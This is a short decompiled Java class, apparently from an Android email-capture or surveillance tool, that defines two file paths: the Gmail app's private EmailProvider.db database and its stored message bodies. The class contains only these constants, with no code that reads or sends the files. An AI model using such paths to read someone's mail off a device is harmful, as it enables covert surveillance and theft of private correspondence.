package com.vvt.capture.email.b;

public class c
{
  public static final String a;
  public static final String b;
  
  static
  {
    int i = 1;
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "com.google.android.gm";
    arrayOfObject[i] = "EmailProvider.db";
    a = String.format("/data/data/%s/databases/%s", arrayOfObject);
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "com.google.android.gm";
    b = String.format("/data/data/%s/files/body", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */